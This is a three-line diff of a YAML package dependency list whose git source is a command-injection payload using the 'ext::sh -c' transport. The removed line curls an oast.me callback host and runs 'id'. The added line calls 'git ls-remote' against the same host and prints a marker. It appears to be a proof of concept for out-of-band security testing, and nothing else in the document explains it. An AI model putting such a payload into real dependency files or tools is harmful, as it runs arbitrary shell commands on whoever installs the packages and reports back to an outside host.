@@ -1,3 +1,3 @@
 packages:
-  - git: "ext::sh -c 'echo H282-EXT-EXEC; curl -sS -m 5 https://dc33biq1af36dsaabccgqx7qcknb3iy9w.oast.me/h282-ext; id'"
+  - git: "ext::sh -c 'git ls-remote https://dc33biq1af36dsaabccgqx7qcknb3iy9w.oast.me/h282-extgit >/dev/null 2>&1; echo H282-EXT-GIT-RAN >&2'"
     revision: main
